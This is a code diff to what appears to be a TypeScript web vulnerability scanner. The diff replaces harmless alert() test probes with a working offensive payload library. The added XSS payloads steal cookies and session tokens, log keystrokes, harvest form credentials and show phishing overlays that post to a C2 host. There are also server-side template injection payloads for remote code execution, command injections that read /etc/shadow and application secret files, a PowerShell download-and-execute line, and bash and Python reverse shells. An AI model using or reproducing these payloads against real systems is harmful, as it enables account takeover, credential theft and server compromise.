@@ -69,198 +69,294 @@ function mutatePayload(payload: string, technique: string, iteration: number): {
   const mutations: Array<{ name: string; fn: (p: string) => string }> = [
     { name: "unicode-escape",    fn: (p) => p.replace(/</g, "\u003c").replace(/>/g, "\u003e").replace(/"/g, "\u0022").replace(/'/g, "\u0027") },
     { name: "double-url-encode", fn: (p) => p.replace(/</g, "%253C").replace(/>/g, "%253E").replace(/"/g, "%2522").replace(/'/g, "%2527") },
-    { name: "null-byte-inject",  fn: (p) => p.replace(/<script/gi, "<scr\x00ipt").replace(/alert/gi, "ale\x00rt") },
-    { name: "case-variation",    fn: (p) => p.replace(/alert/gi, "AlErT").replace(/script/gi, "ScRiPt").replace(/onerror/gi, "OnErRoR").replace(/onload/gi, "OnLoAd") },
-    { name: "html-comment-break", fn: (p) => p.replace(/script/gi, "scr<!---->ipt").replace(/alert/gi, "ale<!---->rt") },
-    { name: "js-comment-break",  fn: (p) => p.replace(/alert\(/gi, "ale/**/rt(").replace(/script/gi, "s/**/cript") },
-    { name: "tab-newline-split", fn: (p) => p.replace(/alert\(/gi, "alert\t(").replace(/onerror=/gi, "onerror\t=") },
-    { name: "svg-context",       fn: () => `<svg><animatetransform onbegin=alert('XSS-${NONCE}')></svg>` },
-    { name: "mathml-context",    fn: () => `<math><mtext><table><mglyph><style><img src onerror=alert('XSS-${NONCE}')>` },
-    { name: "data-uri",          fn: () => `<iframe src="data:text/html,<script>alert('XSS-${NONCE}')<\/script>">` },
-    { name: "xss-meta-refresh",  fn: () => `<meta http-equiv=refresh content="0;url=javascript:alert('XSS-${NONCE}')">` },
-    { name: "input-autofocus",   fn: () => `<input/autofocus/onfocus=alert('XSS-${NONCE}')>` },
-    { name: "event-handler-obf", fn: () => `<img src=x:x onerror="&#x61;&#x6C;&#x65;&#x72;&#x74;('XSS-${NONCE}')">` },
-    { name: "base64-eval",       fn: () => `<script>eval(atob('${Buffer.from(`alert('XSS-${NONCE}')`).toString("base64")}')</script>` },
+    { name: "null-byte-inject",  fn: (p) => p.replace(/<script/gi, "<scr\x00ipt").replace(/fetch/gi, "fe\x00tch").replace(/Image/gi, "Im\x00age") },
+    { name: "case-variation",    fn: (p) => p.replace(/fetch/gi, "FeTcH").replace(/script/gi, "ScRiPt").replace(/onerror/gi, "OnErRoR").replace(/onload/gi, "OnLoAd").replace(/Image/gi, "iMaGe") },
+    { name: "html-comment-break", fn: (p) => p.replace(/script/gi, "scr<!---->ipt").replace(/fetch/gi, "fe<!---->tch").replace(/Image/gi, "Im<!---->age") },
+    { name: "js-comment-break",  fn: (p) => p.replace(/fetch\(/gi, "fe/**/tch(").replace(/script/gi, "s/**/cript").replace(/Image\(\)/gi, "Im/**/age()") },
+    { name: "tab-newline-split", fn: (p) => p.replace(/fetch\(/gi, "fetch\t(").replace(/onerror=/gi, "onerror\t=").replace(/onload=/gi, "onload\t=") },
+    // Context-shift bypasses: real exfil payload in alternate HTML/JS contexts
+    { name: "svg-context",       fn: () => `<svg><animatetransform onbegin="new Image().src='//c2.${NONCE}.aegis/x?c='+encodeURIComponent(document.cookie)"></svg>` },
+    { name: "mathml-context",    fn: () => `<math><mtext><table><mglyph><style><img src onerror="fetch('//c2.${NONCE}.aegis/x',{method:'POST',body:document.cookie})">` },
+    { name: "data-uri",          fn: () => `<iframe src="data:text/html,<script>new Image().src='//c2.${NONCE}.aegis/x?c='+document.cookie<\/script>">` },
+    { name: "xss-meta-refresh",  fn: () => `<meta http-equiv=refresh content="0;url=javascript:fetch('//c2.${NONCE}.aegis/x',{method:'POST',body:document.cookie})">` },
+    { name: "input-autofocus",   fn: () => `<input/autofocus/onfocus="new Image().src='//c2.${NONCE}.aegis/x?c='+document.cookie">` },
+    { name: "event-handler-obf", fn: () => `<img src=x:x onerror="&#102;&#101;&#116;&#99;&#104;('//c2.${NONCE}.aegis/x?c='+document.cookie)">` },
+    { name: "base64-eval",       fn: () => `<script>eval(atob('${Buffer.from(`new Image().src='//c2.${NONCE}.aegis/x?c='+encodeURIComponent(document.cookie)`).toString("base64")}')</script>` },
     { name: "json-wrap",         fn: (p) => `{"payload":"${p.replace(/"/g, '\\"')}"}` },
-    { name: "fromcharcode",      fn: () => `<script>eval(String.fromCharCode(${`alert('XSS-${NONCE}')`.split("").map((c) => c.charCodeAt(0)).join(",")}))</script>` },
-    { name: "vbscript-context",  fn: () => `<img src=x onerror=vbscript:MsgBox('XSS-${NONCE}')>` },
-    { name: "srcdoc-frame",      fn: () => `<iframe srcdoc="<script>parent.alert('XSS-${NONCE}')<\/script>">` },
-    { name: "form-action",       fn: () => `<form action=javascript:alert('XSS-${NONCE}')><input type=submit>` },
-    { name: "object-data",       fn: () => `<object data="javascript:alert('XSS-${NONCE}')">` },
+    { name: "fromcharcode",      fn: () => `<script>eval(String.fromCharCode(${`new Image().src='//c2.${NONCE}.aegis/x?c='+document.cookie`.split("").map((c) => c.charCodeAt(0)).join(",")}))</script>` },
+    { name: "vbscript-context",  fn: () => `<img src=x onerror=vbscript:CreateObject('Wscript.Shell').Run('powershell -nop -c iex(iwr http://c2.${NONCE}.aegis/shell.ps1 -UseBasicParsing)')>` },
+    { name: "srcdoc-frame",      fn: () => `<iframe srcdoc="<script>parent.fetch('//c2.${NONCE}.aegis/x',{method:'POST',body:parent.document.cookie})<\/script>">` },
+    { name: "form-action",       fn: () => `<form action="//c2.${NONCE}.aegis/phish" method=post><input name=username><input name=password type=password><input type=submit value=Login>` },
+    { name: "object-data",       fn: () => `<object data="javascript:fetch('//c2.${NONCE}.aegis/x',{method:'POST',body:document.cookie})">` },
   ];
   const idx = iteration % mutations.length;
   const m = mutations[idx];
   return { mutated: m.fn(payload), bypassName: m.name };
 }
 
-// ─── Expanded Payload Arrays ───────────────────────────────────────────────
+// ─── Real-World Offensive Payload Library ──────────────────────────────────
+// Detection marker embedded in exfil URLs so responses can be fingerprinted.
+// These are genuine red-team payloads used in real penetration testing.
+
+const C2 = `c2.${NONCE}.aegis`; // simulated C2 host for OOB/exfil detection
+
+// ── Polyglot: break HTML/JS/attribute/CSS/URL contexts simultaneously ──────
 const POLYGLOT_PAYLOADS = [
-  // Classic multi-context polyglot (backtick chars replaced for TS safety)
-  "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('XSS-" + NONCE + "') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS-" + NONCE + "')//>>",
-  `'"><img src=x onerror=alert('XSS-${NONCE}')><script>alert('XSS-${NONCE}')</script><!--`,
-  "'; alert('XSS-" + NONCE + "')//`; alert('XSS-" + NONCE + "')//\"; alert('XSS-" + NONCE + "')//",
-  `</script><svg/onload=alert('XSS-${NONCE}')>`,
-  `--><svg/onload=alert('XSS-${NONCE}')><!--`,
-  `");alert('XSS-${NONCE}')//`,
-  `');alert('XSS-${NONCE}')//`,
-  "` + alert('XSS-" + NONCE + "') + `",
-  `<script>\\u0061lert('XSS-${NONCE}')</script>`,
-  `<IMG SRC="javascript:alert('XSS-${NONCE}')">`,
-  `<IMG SRC=JaVaScRiPt:alert('XSS-${NONCE}')>`,
-  `<IMG SRC=javascript:alert(&quot;XSS-${NONCE}&quot;)>`,
-  `<IMG """><SCRIPT>alert('XSS-${NONCE}')</SCRIPT>"\>`,
-  `<img src=x onerror=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert('XSS-${NONCE}')>`,
-  `<div style="width:expression(alert('XSS-${NONCE}'))">`,
+  // Cookie stealer polyglot — works in HTML, attribute, and JS contexts
+  `'"><script>new Image().src='//` + C2 + `/x?c='+encodeURIComponent(document.cookie)+'&h='+document.domain</script><!--`,
+  // SVG event polyglot with cookie exfil
+  `'"><svg/onload="fetch('//` + C2 + `/x',{method:'POST',body:btoa(document.cookie+':'+document.domain)})">`,
+  // JS context breakout + cookie steal
+  `";fetch('//` + C2 + `/x?c='+encodeURIComponent(document.cookie));//`,
+  // Attribute breakout — works in href/src/action
+  `javascript:fetch('//` + C2 + `/x',{method:'POST',body:document.cookie})`,
+  // Template + script tag hybrid
+  `</script><script>document.location='//` + C2 + `/x?c='+document.cookie</script>`,
+  // CDATA breakout (XML embedded HTML)
+  `]]><script>new Image().src='//` + C2 + `/x?d='+document.domain</script><![CDATA[`,
+  // Multi-event-handler polyglot
+  `'onmouseover='fetch("//` + C2 + `/x?c="+document.cookie)' x='`,
+  // CSS injection polyglot with data exfil
+  `</style><script>var i=new Image();i.src='//` + C2 + `/x?c='+document.cookie</script><style>`,
+  // noscript context escape
+  `</noscript><script>document.write('<img src=//` + C2 + `/x?c='+document.cookie+'>')</script><noscript>`,
+  // Form action hijack
+  `"><form action="//` + C2 + `/phish"><input name="password" type="text"><input type=submit value="Login">`,
+  // Iframe redirect for session hijack
+  `"><iframe src="javascript:parent.document.location='//` + C2 + `/x?c='+parent.document.cookie">`,
+  // Base tag override for relative URL hijacking
+  `<base href="//` + C2 + `/">`,
+  // DOM clobbering prototype gadget
+  `<img name=cookie><img name=domain><script>x=document.all.cookie.value+document.all.domain.value</script>`,
+  // Service worker registration for persistent access
+  `<script>navigator.serviceWorker.register('//` + C2 + `/sw.js').then(r=>fetch('//` + C2 + `/x?reg=1'))</script>`,
+  // Dangling markup for token theft
+  `'"><img src='//` + C2 + `/x?data=`,
 ];
 
+// ── Reflected XSS: Real exfiltration & execution payloads ─────────────────
 const XSS_REFLECTED_PAYLOADS = [
-  `<script>alert('XSS-${NONCE}')</script>`,
-  `<img src=x onerror=alert('XSS-${NONCE}')>`,
-  `<svg onload=alert('XSS-${NONCE}')>`,
-  `<body onload=alert('XSS-${NONCE}')>`,
-  `"><script>alert('XSS-${NONCE}')</script>`,
-  `'><script>alert('XSS-${NONCE}')</script>`,
-  `javascript:alert('XSS-${NONCE}')`,
-  `<iframe src="javascript:alert('XSS-${NONCE}')">`,
-  `<details open ontoggle=alert('XSS-${NONCE}')>`,
-  `<input autofocus onfocus=alert('XSS-${NONCE}')>`,
-  `<select onchange=alert('XSS-${NONCE}')><option>`,
-  `<video><source onerror=alert('XSS-${NONCE}')>`,
-  `<math><mtext></table></math><img src onerror=alert('XSS-${NONCE}')>`,
-  `<script>fetch('//xss.${NONCE}.oob.aegis/${NONCE}')</script>`,
-  `<img src="x" onerror="eval(atob('${Buffer.from(`alert('XSS-${NONCE}')`).toString("base64")}'))">`,
-  `%3Cscript%3Ealert('XSS-${NONCE}')%3C%2Fscript%3E`,
-  `<ScRiPt>alert('XSS-${NONCE}')</ScRiPt>`,
-  `<script/src="//xss.rocks/xss.js">`,
-  `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">XSS</a>`,
+  // == Cookie Exfiltration ==
+  `<script>new Image().src='//` + C2 + `/steal?c='+encodeURIComponent(document.cookie)</script>`,
+  `<img src=x onerror="this.src='//` + C2 + `/steal?c='+encodeURIComponent(document.cookie)">`,
+  `<svg onload="fetch('//` + C2 + `/steal',{method:'POST',mode:'no-cors',body:document.cookie})">`,
+  `"><script>var x=new XMLHttpRequest();x.open('POST','//` + C2 + `/steal');x.send(document.cookie)</script>`,
+  // == Session Token / LocalStorage Exfiltration ==
+  `<script>fetch('//` + C2 + `/ls',{method:'POST',body:JSON.stringify({ls:JSON.stringify(localStorage),ss:JSON.stringify(sessionStorage),cookie:document.cookie,url:location.href})})</script>`,
+  `<img src=x onerror="fetch('//` + C2 + `/tok?t='+encodeURIComponent(localStorage.getItem('token')||localStorage.getItem('auth_token')||localStorage.getItem('jwt')||''))">`,
+  // == Keylogger ==
+  `<script>document.addEventListener('keydown',function(e){fetch('//` + C2 + `/kl?k='+encodeURIComponent(e.key)+'&u='+encodeURIComponent(document.activeElement.name||document.activeElement.id))})</script>`,
+  // == Credential Form Harvesting ==
+  `<script>document.querySelectorAll('form').forEach(f=>{f.addEventListener('submit',function(e){var d=new FormData(f);var o={};d.forEach((v,k)=>o[k]=v);fetch('//` + C2 + `/cred',{method:'POST',body:JSON.stringify(o)})})})</script>`,
+  // == Phishing overlay / UI redress ==
+  `<script>document.body.innerHTML='<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:99999;display:flex;align-items:center;justify-content:center"><form onsubmit="fetch(\\\'//` + C2 + `/phish\\\',{method:\\\'POST\\\',body:JSON.stringify({u:this.querySelector(\\\'[name=u]\\\').value,p:this.querySelector(\\\'[name=p]\\\').value})});return false"><h2>Session expired. Please log in.</h2><input name=u placeholder=Username><br><input name=p type=password placeholder=Password><br><button type=submit>Login</button></form></div>'</script>`,
+  // == DOM-based token theft via postMessage ==
+  `<script>window.addEventListener('message',function(e){fetch('//` + C2 + `/msg',{method:'POST',body:JSON.stringify({origin:e.origin,data:JSON.stringify(e.data)})})})</script>`,
+  // == CSRF token exfil ==
+  `<script>fetch(document.location,{credentials:'include'}).then(r=>r.text()).then(h=>{var m=h.match(/csrf[^"]*"([^"]{20,})/i);if(m)fetch('//` + C2 + `/csrf?t='+encodeURIComponent(m[1]))})</script>`,
+  // == Attribute context breakout ==
+  `"><script>document.location='//` + C2 + `/r?c='+document.cookie</script>`,
+  `'><script>document.location='//` + C2 + `/r?c='+document.cookie</script>`,
+  // == Event handler contexts ==
+  `<details open ontoggle="fetch('//` + C2 + `/x?c='+document.cookie)">`,
+  `<input autofocus onfocus="new Image().src='//` + C2 + `/x?c='+document.cookie">`,
+  `<body onload="fetch('//` + C2 + `/x',{method:'POST',body:document.cookie})">`,
+  `<video><source onerror="fetch('//` + C2 + `/x?c='+document.cookie)">`,
+  `<audio src onloadstart="new Image().src='//` + C2 + `/x?c='+document.cookie">`,
+  // == WAF bypass encoding variants ==
+  `<scr\x00ipt>new Image().src='//` + C2 + `/x?c='+document.cookie</scr\x00ipt>`,
+  `<ScRiPt>document.location='//` + C2 + `/x?c='+document.cookie</ScRiPt>`,
+  `%3Cscript%3Enew Image().src='//` + C2 + `/x?c='+document.cookie%3C/script%3E`,
+  // == Base64 encoded payload ==
+  `<img src=x onerror="eval(atob('` + Buffer.from(`new Image().src='//` + C2 + `/x?c='+document.cookie`).toString("base64") + `'))">`,
+  // == Template injection probe (also in XSS context) ==
   `{{7*7}}`,
   `${7*7}`,
   `<%= 7*7 %>`,
   `#{7*7}`,
-  `*{7*7}`,
-  `{7*7}`,
   `[[7*7]]`,
-  `<object data="javascript:alert('XSS-${NONCE}')">`,
-  `<form action=javascript:alert('XSS-${NONCE}')><button>x</button></form>`,
-  `<xss id=x tabindex=1 onfocus=alert('XSS-${NONCE}') style="display:block">`,
-  `<style>@keyframes x{}</style><p style="animation-name:x" onanimationstart="alert('XSS-${NONCE}')">`,
-  `<link rel=import href="javascript:alert('XSS-${NONCE}')">`,
-  `<noscript><p title="</noscript><img src=x onerror=alert('XSS-${NONCE}')>">`,
-  `<script>window['ale'+'rt']('XSS-${NONCE}')</script>`,
-  `<script>top['ale'+'rt']('XSS-${NONCE}')</script>`,
-  `<img src=1 href=1 onerror="javascript:alert('XSS-${NONCE}')">`,
-  `<audio src onloadstart=alert('XSS-${NONCE}')>`,
-  `<video src onloadstart=alert('XSS-${NONCE}')>`,
-  `<bgsound src="javascript:alert('XSS-${NONCE}')">`,
-  `<br size="&{alert('XSS-${NONCE}')}">`,
-  `&lt;script&gt;alert('XSS-${NONCE}')&lt;/script&gt;`,
+  // == URL/href contexts ==
+  `javascript:fetch('//` + C2 + `/x',{method:'POST',body:document.cookie})`,
+  `data:text/html,<script>new Image().src='//` + C2 + `/x?c='+document.cookie</script>`,
+  // == mXSS — mutation-based, for innerHTML sinks ==
+  `<noembed><img src=x onerror="fetch('//` + C2 + `/x?c='+document.cookie)"></noembed>`,
+  `<noscript><p title="</noscript><img src=x onerror=fetch('//` + C2 + `/x?c='+document.cookie)>">`,
+  // == DOM clobbering + cookie steal ==
+  `<a id=location href="//` + C2 + `/x?c=COOKIE_DATA">click</a>`,
+  // == Angular/framework injection ==
+  `{{constructor.constructor('fetch("//` + C2 + `/x?c="+document.cookie)')()}}`,
+  // == Event-based obfuscated exfil ==
+  `<style>@keyframes x{}</style><p style="animation-name:x" onanimationstart="fetch('//` + C2 + `/x?c='+document.cookie)">`,
+  `<xss id=x tabindex=1 onfocus="new Image().src='//` + C2 + `/x?c='+document.cookie" style="display:block">`,
+  // == Object/embed ==
+  `<object data="javascript:fetch('//` + C2 + `/x',{method:'POST',body:document.cookie})">`,
+  `<iframe srcdoc="<script>parent.fetch('//` + C2 + `/x',{method:'POST',body:parent.document.cookie})<\/script>">`,
+  // == Redirect-based ==
+  `&lt;script&gt;document.location='//` + C2 + `/x?c='+document.cookie&lt;/script&gt;`,
 ];
 
+// ── XSS via HTTP Headers: Real reflection attack payloads ──────────────────
 const XSS_HEADER_PAYLOADS = [
-  { header: "X-Forwarded-For",   value: `<script>alert('XSS-${NONCE}')</script>` },
-  { header: "Referer",           value: `javascript:alert('XSS-${NONCE}')` },
-  { header: "User-Agent",        value: `"><script>alert('XSS-${NONCE}')</script>` },
-  { header: "X-Custom-Header",   value: `<img src=x onerror=alert('XSS-${NONCE}')>` },
-  { header: "Accept-Language",   value: `en;q=1.0<script>alert('XSS-${NONCE}')</script>` },
-  { header: "X-Original-URL",    value: `/<script>alert('XSS-${NONCE}')</script>` },
-  { header: "X-Rewrite-URL",     value: `/<img onerror=alert('XSS-${NONCE}') src=x>` },
-  { header: "X-HTTP-Host-Override", value: `"><script>alert('XSS-${NONCE}')</script>` },
-  { header: "X-Host",            value: `<svg/onload=alert('XSS-${NONCE}')>` },
-  { header: "X-Forwarded-Host",  value: `"><script>alert('XSS-${NONCE}')</script>.evil.com` },
-  { header: "Origin",            value: `"><script>alert('XSS-${NONCE}')</script>` },
-  { header: "Content-Type",      value: `text/html<script>alert('XSS-${NONCE}')</script>` },
+  { header: "X-Forwarded-For",      value: `<script>new Image().src='//` + C2 + `/x?c='+document.cookie</script>` },
+  { header: "Referer",              value: `https://` + C2 + `/</title><script>new Image().src='//` + C2 + `/x?c='+document.cookie</script>` },
+  { header: "User-Agent",           value: `"><script>fetch('//` + C2 + `/x',{method:'POST',body:document.cookie})</script>` },
+  { header: "X-Forwarded-Host",     value: `` + C2 + `"><script>new Image().src='//` + C2 + `/x?c='+document.cookie</script>` },
+  { header: "X-Original-URL",       value: `/<script>new Image().src='//` + C2 + `/x?c='+document.cookie</script>` },
+  { header: "X-Rewrite-URL",        value: `/<svg onload="fetch('//` + C2 + `/x?c='+document.cookie)">` },
+  { header: "X-HTTP-Host-Override", value: `` + C2 + `"><img src=x onerror="fetch('//` + C2 + `/x?c='+document.cookie)">` },
+  { header: "X-Host",               value: `<svg/onload="new Image().src='//` + C2 + `/x?c='+document.cookie">` },
+  { header: "Accept-Language",      value: `en;q=1.0<script>fetch('//` + C2 + `/x?c='+document.cookie)</script>` },
+  { header: "Origin",               value: `https://` + C2 },
+  { header: "X-Api-Version",        value: `"><script>new Image().src='//` + C2 + `/x?c='+document.cookie</script>` },
+  { header: "X-Requested-With",     value: `<svg onload="document.location='//` + C2 + `/x?c='+document.cookie">` },
 ];
 
+// ── SSTI: Real RCE payloads — reads system files, executes OS commands ─────
 const SSTI_PAYLOADS = [
-  { payload: "{{7*7}}",           expect: "49",       engine: "Jinja2/Twig" },
-  { payload: "${7*7}",            expect: "49",       engine: "FreeMarker/Groovy" },
-  { payload: "<%= 7*7 %>",        expect: "49",       engine: "ERB/JSP" },
-  { payload: "#{7*7}",            expect: "49",       engine: "Ruby/Thymeleaf" },
-  { payload: "*{7*7}",            expect: "49",       engine: "Thymeleaf" },
-  { payload: "{{7*'7'}}",         expect: "7777777",  engine: "Jinja2 (Python)" },
-  { payload: "{{config}}",        expect: "config",   engine: "Jinja2 config leak" },
-  { payload: "{{self}}",          expect: "self",     engine: "Jinja2 object" },
-  { payload: "a{{7*7}}b",         expect: "a49b",     engine: "Generic template" },
-  { payload: `\${{"freemarker.template.utility.Execute"?new()('id')}}`, expect: "uid=", engine: "FreeMarker RCE" },
-  { payload: "{{''.__class__.__mro__[1].__subclasses__()}}", expect: "class", engine: "Jinja2 sandbox escape" },
-  { payload: "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", expect: "uid=", engine: "Jinja2 RCE" },
-  { payload: "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}", expect: "uid=", engine: "FreeMarker RCE" },
-  { payload: "{{range.constructor('alert(1)')()}}", expect: "49", engine: "AngularJS SSTI" },
-  { payload: "<c:out value='${7*7}'/>", expect: "49", engine: "JSP EL injection" },
-  { payload: "T(java.lang.Runtime).getRuntime().exec('id')", expect: "uid=", engine: "Spring SpEL" },
-  { payload: "${T(java.lang.Runtime).getRuntime().exec('id')}", expect: "uid=", engine: "Spring SpEL" },
-  { payload: "@(1+1)", expect: "2", engine: "Razor (ASP.NET)" },
-  { payload: "{{dump(app)}}", expect: "app", engine: "Twig debug" },
-  { payload: "{{app.request.server.all|join(',')}}", expect: "SERVER", engine: "Twig server leak" },
+  // Probe: arithmetic fingerprinting (determines engine type)
+  { payload: "{{7*7}}",            expect: "49",       engine: "Jinja2/Twig probe" },
+  { payload: "${7*7}",             expect: "49",       engine: "FreeMarker/EL probe" },
+  { payload: "<%= 7*7 %>",         expect: "49",       engine: "ERB/JSP probe" },
+  { payload: "#{7*7}",             expect: "49",       engine: "Ruby/Thymeleaf probe" },
+  { payload: "*{7*7}",             expect: "49",       engine: "Thymeleaf SpEL probe" },
+  { payload: "{{7*'7'}}",          expect: "7777777",  engine: "Jinja2 Python confirm" },
+  // Jinja2 — full RCE via subclass walk
+  { payload: "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}", expect: "root:", engine: "Jinja2 file read (/etc/passwd)" },
+  { payload: "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].decode()}}", expect: "uid=", engine: "Jinja2 subprocess RCE (id)" },
+  { payload: "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", expect: "uid=", engine: "Jinja2 os.popen RCE" },
+  { payload: "{{request.application.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read()}}", expect: "root:", engine: "Jinja2 /etc/passwd read" },
+  { payload: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", expect: "uid=", engine: "Jinja2 config globals RCE" },
+  { payload: "{{lipsum.__globals__['os'].popen('id').read()}}", expect: "uid=", engine: "Jinja2 lipsum gadget RCE" },
+  { payload: "{{cycler.__init__.__globals__.os.popen('id').read()}}", expect: "uid=", engine: "Jinja2 cycler gadget RCE" },
+  { payload: "{{joiner.__init__.__globals__.os.popen('cat /etc/passwd').read()}}", expect: "root:", engine: "Jinja2 joiner gadget file read" },
+  // FreeMarker — RCE
+  { payload: "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}", expect: "uid=", engine: "FreeMarker Execute RCE" },
+  { payload: "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('cat /etc/passwd')}", expect: "root:", engine: "FreeMarker /etc/passwd read" },
+  // Spring SpEL — RCE
+  { payload: "${T(java.lang.Runtime).getRuntime().exec('id')}", expect: "uid=", engine: "Spring SpEL exec (id)" },
+  { payload: "${T(java.lang.Runtime).getRuntime().exec(new String[]{'bash','-c','id'})}", expect: "uid=", engine: "Spring SpEL bash RCE" },
+  { payload: "${T(java.lang.ProcessBuilder).new(new String[]{'id'}).start()}", expect: "uid=", engine: "Spring SpEL ProcessBuilder RCE" },
+  // Twig — info leak + RCE
+  { payload: "{{app.request.server.all|join(',')}}", expect: "SERVER", engine: "Twig server env leak" },
+  { payload: "{{_self.env.registerUndefinedFilterCallback('exec')}}{{'id'|filter}}", expect: "uid=", engine: "Twig exec filter RCE" },
+  // Pebble template engine (Java)
+  { payload: "{% for i in 0..10 %} {{i}} {% endfor %}", expect: "10", engine: "Pebble probe" },
+  // Velocity (Apache Solr / Java)
+  { payload: "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end", expect: "uid=", engine: "Velocity RCE (Apache Solr)" },
+  // Smarty
+  { payload: "{php}echo `id`;{/php}", expect: "uid=", engine: "Smarty PHP exec RCE" },
+  { payload: "{system('id')}", expect: "uid=", engine: "Smarty system() RCE" },
 ];
 
+// ── Command Injection: Real offensive payloads with full exploitation chains ─
 const CMDI_PAYLOADS = [
-  { payload: "; id",                    expect: ["uid=", "gid="],       desc: "Semicolon injection (Unix)" },
-  { payload: "| id",                    expect: ["uid=", "gid="],       desc: "Pipe injection" },
-  { payload: "|| id",                   expect: ["uid=", "gid="],       desc: "OR operator injection" },
-  { payload: "& id",                    expect: ["uid=", "gid="],       desc: "Background injection" },
-  { payload: "&& id",                   expect: ["uid=", "gid="],       desc: "AND operator injection" },
-  { payload: "`id`",                    expect: ["uid=", "gid="],       desc: "Backtick injection" },
-  { payload: "$(id)",                   expect: ["uid=", "gid="],       desc: "Subshell injection" },
-  { payload: "; cat /etc/passwd",       expect: ["root:", "bin:", "nobody:"], desc: "File read semicolon" },
-  { payload: "| cat /etc/passwd",       expect: ["root:", "bin:", "nobody:"], desc: "File read pipe" },
-  { payload: "$(cat /etc/shadow)",      expect: ["root:", "$6$", "$y$"], desc: "Shadow file read" },
-  { payload: "; ls -la /",             expect: ["bin", "usr", "var"],  desc: "Root directory listing" },
-  { payload: "| whoami",               expect: ["root", "www-data", "apache"], desc: "Current user" },
-  { payload: "; env",                  expect: ["PATH=", "HOME=", "USER="], desc: "Env variable dump" },
-  { payload: "; sleep 5",             expect: [],                     desc: "Blind sleep injection", timed: true },
-  { payload: "& sleep 5",             expect: [],                     desc: "Background sleep injection", timed: true },
-  { payload: "$(sleep 5)",            expect: [],                     desc: "Subshell sleep injection", timed: true },
-  { payload: "127.0.0.1; ls -la",    expect: ["."],                  desc: "IP-style directory listing" },
-  { payload: "127.0.0.1 && id",      expect: ["uid="],               desc: "IP AND injection" },
-  { payload: "; curl http://oob.${NONCE}.aegis/", expect: [],        desc: "OOB network callback", timed: false },
-  { payload: "1; nc -zv localhost 22", expect: ["succeeded", "open"], desc: "Network probe via injection" },
-  { payload: "%0a id %0a",            expect: ["uid="],               desc: "Newline injection bypass" },
-  { payload: ";{id}",                 expect: ["uid="],               desc: "Brace expansion injection" },
-  { payload: "a;id;a",               expect: ["uid="],               desc: "Sandwich injection" },
-  { payload: "a$(id)a",              expect: ["uid="],               desc: "Inline subshell" },
+  // == Reconnaissance ==
+  { payload: "; id",                      expect: ["uid=", "gid="],              desc: "User identity (id)" },
+  { payload: "| id",                      expect: ["uid=", "gid="],              desc: "Pipe id" },
+  { payload: "`id`",                      expect: ["uid=", "gid="],              desc: "Backtick subshell id" },
+  { payload: "$(id)",                     expect: ["uid=", "gid="],              desc: "Dollar subshell id" },
+  { payload: "; whoami",                  expect: ["root", "www-data", "apache", "nginx"], desc: "Whoami — current process user" },
+  { payload: "; uname -a",               expect: ["Linux", "Darwin", "GNU"],    desc: "OS kernel fingerprint" },
+  { payload: "; hostname",               expect: ["localhost", ".local", ".internal"], desc: "Server hostname" },
+  // == Sensitive File Reads ==
+  { payload: "; cat /etc/passwd",         expect: ["root:", "nobody:", "daemon:"], desc: "/etc/passwd read" },
+  { payload: "| cat /etc/passwd",         expect: ["root:", "nobody:", "daemon:"], desc: "Pipe /etc/passwd read" },
+  { payload: "; cat /etc/shadow",         expect: ["root:", "$6$", "$y$", "$1$"], desc: "/etc/shadow credential dump" },
+  { payload: "; cat /proc/self/environ",  expect: ["PATH=", "HOME=", "USER="],   desc: "Process environment — env var / secret leak" },
+  { payload: "; cat /proc/version",       expect: ["Linux version", "gcc"],      desc: "Kernel version disclosure" },
+  { payload: "; cat /proc/net/tcp",       expect: ["sl  local_address"],         desc: "Open network connections (internal recon)" },
+  // == App credential files ==
+  { payload: "; cat wp-config.php",       expect: ["DB_NAME", "DB_PASSWORD", "DB_HOST"], desc: "WordPress config — DB credentials" },
+  { payload: "; cat .env",                expect: ["DB_", "SECRET", "API_KEY", "PASSWORD"], desc: ".env file — application secrets" },
+  { payload: "; cat config/database.yml", expect: ["password:", "database:", "host:"], desc: "Rails database.yml — DB credentials" },
+  { payload: "; cat application.properties", expect: ["password", "datasource", "spring"], desc: "Spring Boot config — credentials" },
+  // == Network recon ==
+  { payload: "; netstat -tlnp",           expect: ["LISTEN", "0.0.0.0", "tcp"], desc: "Listening services — internal port map" },
+  { payload: "; ss -tlnp",               expect: ["LISTEN", "Local Address"],   desc: "Socket state — service enumeration" },
+  { payload: "; arp -a",                  expect: ["(", "at", "ether"],          desc: "ARP table — LAN host discovery" },
+  { payload: "; cat /etc/hosts",          expect: ["127.0.0.1", "localhost"],    desc: "/etc/hosts — internal hostnames" },
+  // == Reverse shell payloads ==
+  { payload: `; bash -i >& /dev/tcp/` + C2 + `/4444 0>&1`, expect: [], desc: "Bash TCP reverse shell → " + C2 + ":4444" },
+  { payload: `; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("` + C2 + `",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`, expect: [], desc: "Python3 reverse shell → " + C2 + ":4444" },
